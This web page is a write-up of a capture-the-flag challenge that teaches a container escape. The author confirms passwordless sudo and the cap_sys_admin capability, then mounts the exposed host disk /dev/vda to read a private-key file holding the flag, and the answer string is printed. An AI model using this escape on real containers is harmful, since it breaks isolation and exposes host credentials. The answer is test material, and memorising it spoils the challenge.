<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-hhc2022/elfen_ring/prison_escape">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.2.0">
<title data-rh="true">Prison Escape | Devan and Kim</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://your-docusaurus-test-site.com/hhc2022/docs/hhc2022/elfen_ring/prison_escape/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Prison Escape | Devan and Kim"><meta data-rh="true" name="description" content="Background"><meta data-rh="true" property="og:description" content="Background"><link data-rh="true" rel="icon" href="/hhc2022/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://your-docusaurus-test-site.com/hhc2022/docs/hhc2022/elfen_ring/prison_escape/"><link data-rh="true" rel="alternate" href="https://your-docusaurus-test-site.com/hhc2022/docs/hhc2022/elfen_ring/prison_escape/" hreflang="en"><link data-rh="true" rel="alternate" href="https://your-docusaurus-test-site.com/hhc2022/docs/hhc2022/elfen_ring/prison_escape/" hreflang="x-default"><link rel="stylesheet" href="/hhc2022/assets/css/styles.5bd81ef5.css">
<link rel="preload" href="/hhc2022/assets/js/runtime~main.21009385.js" as="script">
<link rel="preload" href="/hhc2022/assets/js/main.388b6a01.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#docusaurus_skipToContent_fallback">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/hhc2022/"><div class="navbar__logo"><img src="/hhc2022/img/logo.svg" alt="My Site Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/hhc2022/img/logo.svg" alt="My Site Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Devan and Kim</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/hhc2022/docs/hhc2022/">Holiday Hack Challenge 2022</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebar_njMd"><nav class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/hhc2022/docs/hhc2022/">Holiday Hack Challenge 2022 Write-Up</a><button aria-label="Toggle the collapsible sidebar category &#x27;Holiday Hack Challenge 2022 Write-Up&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/hhc2022/docs/hhc2022/tolkien_ring/">The Tolkien Ring</a><button aria-label="Toggle the collapsible sidebar category &#x27;The Tolkien Ring&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/hhc2022/docs/hhc2022/elfen_ring/">The Elfen Ring</a><button aria-label="Toggle the collapsible sidebar category &#x27;The Elfen Ring&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/hhc2022/docs/hhc2022/elfen_ring/clone_with_a_difference/">Clone with a Difference</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/hhc2022/docs/hhc2022/elfen_ring/prison_escape/">Prison Escape</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/hhc2022/docs/hhc2022/elfen_ring/jolly_cicd/">Jolly CI/CD</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/hhc2022/docs/hhc2022/web_ring/">The Web Ring</a><button aria-label="Toggle the collapsible sidebar category &#x27;The Web Ring&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/hhc2022/docs/hhc2022/cloud_ring/">The Cloud Ring</a><button aria-label="Toggle the collapsible sidebar category &#x27;The Cloud Ring&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/hhc2022/docs/hhc2022/burning_ring_of_fire/">The Burning Ring of Fire</a><button aria-label="Toggle the collapsible sidebar category &#x27;The Burning Ring of Fire&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/hhc2022/docs/hhc2022/secrets/">Secrets</a></li></ul></li></ul></nav></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/hhc2022/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_OVgt"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/hhc2022/docs/hhc2022/"><span itemprop="name">Holiday Hack Challenge 2022 Write-Up</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/hhc2022/docs/hhc2022/elfen_ring/"><span itemprop="name">The Elfen Ring</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Prison Escape</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Prison Escape</h1><h3 class="anchor anchorWithStickyNavbar_LWe7" id="background">Background<a class="hash-link" href="#background" title="Direct link to heading">​</a></h3><p>This task asks us to escape a running container and find a file on the host operating system.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="challenge">Challenge<a class="hash-link" href="#challenge" title="Direct link to heading">​</a></h3><div class="theme-admonition theme-admonition-info alert alert--info admonition_LlT9"><div class="admonitionHeading_tbUL"><span class="admonitionIcon_kALy"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Challenge Text</div><div class="admonitionContent_S0QG"><p><em>Difficulty:</em> ★★★✰✰</p><p>Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv?</p></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="answer">Answer<a class="hash-link" href="#answer" title="Direct link to heading">​</a></h3><p>Once we&#x27;re inside our container prison, we start out by checking what we&#x27;re allowed to do as root:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:/mnt$ </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> -l</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User samways may run the following commands on grinchum-land:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ALL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> NOPASSWD: ALL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Great! We have carte blanche to sudo whatever we&#x27;d like as root. Next, we&#x27;ll check our list of Unix capabilities. Normally in a container these should be as restrictive as possible, but let&#x27;s hope someone was lazy here:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:/mnt$ </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> Cap /proc/1/status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CapInh: 0000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CapPrm: 0000003fffffffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CapEff: 0000003fffffffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CapBnd: 0000003fffffffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CapAmb: 0000000000000000</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>To decode this gibberish, we can use the <code>capsh</code> utility (on another host that has it)</p><p><img loading="lazy" alt="Capsh decoded output, showing that we have cap_sys_admin" src="/hhc2022/assets/images/er2-1-dbcc58c86e740e1a6e33d4610caf4b83.png" width="1252" height="332" class="img_ev3q"></p><p>Among the items in this list, the most useful to us by far is <code>cap_sys_admin</code>. The <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener noreferrer">capabilities man page</a> has more info, but this capability allows us to perform a very, very wide array of actions which would be useful for system administration. It just so happens that many of those are also capabilities that would help us break out of our current jail.</p><hr><p>Going through a <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation" target="_blank" rel="noopener noreferrer">helpful list of container escape strategies</a>, we don&#x27;t have to look long before we notice that a disk device is, for some reason, listed under <code>/dev/</code>:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:/mnt$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> -l /dev/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">total </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">crw-r--r-- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root root  </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">235</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 autofs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">crw------- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root root  </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">234</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 btrfs-control</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lrwxrwxrwx </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root root       </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 core -</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> /proc/kcore</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">crw-rw---- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root </span><span class="token function" style="color:#d73a49">tty</span><span class="token plain">    </span><span class="token number" style="color:#36acaa">7</span><span class="token plain">,  </span><span class="token number" style="color:#36acaa">70</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 vcsu6</span><br></span><span class="token-line theme-code-block-highlighted-line" style="color:#393A34"><span class="token plain">brw-rw---- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root disk </span><span class="token number" style="color:#36acaa">254</span><span class="token plain">,   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 vda</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">crw------- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root root  </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">,  </span><span class="token number" style="color:#36acaa">63</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 vsock</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">crw-rw-rw- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root root   </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">,   </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> Jan  </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> 00:59 zero</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Normally the disk device <code>/dev/vda</code> wouldn&#x27;t be mounted inside of the container. However, we all know that developers will complain to senior management if they have to do an ounce of additional work, so here we are. Since we verified earlier that we have the <code>CAP_SYS_ADMIN</code> capability (which helpfully lets us mount and unmount things), we can now easily mount this device and find the flag:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ sudo mount /dev/vda /mnt/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ ls -l /mnt/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.dockerenv  etc/        lib64/      mnt/        run/        tmp/        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin/        home/       libx32/     opt/        sbin/       usr/        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">boot/       lib/        lost+found/ proc/       srv/        var/        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dev/        lib32/      media/      root/       sys/        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ ls -la /mnt/home/jailer/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">total 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-xr-x 3 root root 4096 Dec  1 19:12 .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-xr-x 3 root root 4096 Dec  1 19:12 ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-xr-x 2 root root 4096 Dec  1 19:12 .ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ ls -la /mnt/home/jailer/.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./    ../   .ssh/ </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ ls -la /mnt/home/jailer/.ssh/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">total 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-xr-x 2 root root 4096 Dec  1 19:12 .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drwxr-xr-x 3 root root 4096 Dec  1 19:12 ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-rw- 1 root root 1555 Nov  3 23:36 jail.key.priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-rw- 1 root root    0 Nov  7 18:54 jail.key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ cat /mnt/home/jailer/.ssh/jail.key.priv </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Congratulations! </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          You&#x27;ve found the secret for the </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          HHC22 container escape challenge!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     .--._..--.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              ___   ( _&#x27;-_  -_.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          _.-&#x27;   `-._|  - :- |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      _.-&#x27;           `--...__|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   .-&#x27;                       &#x27;--..___</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  / `._                              \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   `. `._               one           |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     `. `._                           /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       &#x27;. `._    :__________....-----&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         `..`---&#x27;    |-_  _- |___...----..._</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     |_....--&#x27;             `.`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               _...--&#x27;                       `.`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          _..-&#x27;                             _.&#x27;.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       .-&#x27;             step                _.&#x27;.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       |                               _.&#x27;.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       |                   __....------&#x27;-&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       |     __...------&#x27;&#x27;&#x27; _|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       &#x27;--&#x27;&#x27;&#x27;        |-  - _ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               _.-&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;-._</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            _.&#x27;                        |\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          .&#x27;                         _.&#x27; |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          `._          closer           |:.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            `._                     _.&#x27; |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               `..__                 |  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    `---.._.--.    _|  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     | _   - | `-.._|_.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          .--...__   |   -  _|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         .&#x27;_      `--.....__ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        .&#x27;_                 `--..__</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       .&#x27;_                         `.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      .&#x27;_    082bb339ec19de4935867   `-.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      `--..____                        _`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               ```--...____          _..--&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     | - _ ```---.._.&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     |   - _ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     |_ -  - |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     |   - _ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     | -_  -_|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     |   - _ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     |   - _ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                     | -_  -_|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grinchum-land:~$ </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><a class="pagination-nav__link pagination-nav__link--prev" href="/hhc2022/docs/hhc2022/elfen_ring/clone_with_a_difference/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Clone with a Difference</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/hhc2022/docs/hhc2022/elfen_ring/jolly_cicd/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Jolly CI/CD</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#background" class="table-of-contents__link toc-highlight">Background</a></li><li><a href="#challenge" class="table-of-contents__link toc-highlight">Challenge</a></li><li><a href="#answer" class="table-of-contents__link toc-highlight">Answer</a></li></ul></div></div></div></div></main></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div 